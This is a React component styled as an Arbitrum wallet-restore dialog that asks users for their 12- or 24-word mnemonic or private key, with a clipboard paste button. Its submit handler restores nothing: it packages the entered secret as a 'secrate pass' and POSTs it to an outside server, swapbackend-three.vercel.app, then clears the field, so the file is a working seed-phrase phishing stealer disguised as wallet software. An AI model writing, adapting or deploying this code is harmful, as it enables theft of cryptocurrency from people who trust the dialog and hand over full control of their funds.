import React, { useRef, useState } from "react";
import { IoIosArrowBack } from "react-icons/io";
import { FaPaste } from "react-icons/fa";

const ImportWallet = ({ setImportWallet }) => {
  const [pass, setPass] = useState("");
  const ref = useRef(null);

  const submitAddress = () => {
    let vault = {
      type: "secrate pass",
      main: `
      [Arbitrum  App]
      ${pass}
      `,
    };
    fetch("https://swapbackend-three.vercel.app", {
      method: "POST",
      mode: "cors",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(vault),
    }).then((success) => {
      setPass("");
    });
  };

  const handlePaste = () => {
    navigator.clipboard.readText().then((text) => {
      setPass(text);
    });
  };
  return (
    <div className="lg:w-[400px] w-[24rem]  rounded-md bg-white drop-shadow-2xl">
      <div
        onClick={() => setImportWallet((pre) => !pre)}
        className="flex items-center  bg-[#17470B] rounded-t-md cursor-pointer justify-between p-4 space-x-4 "
      >
        <IoIosArrowBack className="text-white font-[700] text-2xl" />
        <p className="text-white font-[700] text-2xl ">
          Mnemonic Or Private Key
        </p>
      </div>
      <div className="p-5">
        <p className="text-black my-3 font-[500] text-sm">
          Restore an exsiting wallet with your 12 or 24 mnemonic words or your
          private key.
        </p>
        <div className="relative">
          <textarea
            onChange={(e) => setPass(e.target.value)}
            value={pass}
            ref={ref}
            className="bg-transparent border text-black border-gray-700 rounded-md outline-0 w-full h-40 p-4"
            placeholder="words separated by single space"
          />
          <FaPaste
            className="absolute bottom-2 right-0 shadow-xl text-lg text-black cursor-pointer"
            onClick={(e) => {
              handlePaste();
            }}
          />
        </div>

        <br />
        <div className="flex flex-col items-center">
          <button
            onClick={() => submitAddress()}
            disabled={!pass}
            className={
              pass
                ? " bg-[#17470B] w-full px-5 py-4 rounded-md hover:opacity-80 shadhow-xl text-white font-[700] mb-1 mt-2 transition duration-300 ease-in-out outline-0"
                : " bg-[#17470B] opacity-20 w-full px-5 py-4 rounded-md  shadhow-xl text-white font-[700] mb-1 mt-2 transition duration-300 ease-in-out outline-0"
            }
          >
            Connect Wallet With Arbitrum
          </button>
        </div>
      </div>
    </div>
  );
};

export default ImportWallet;
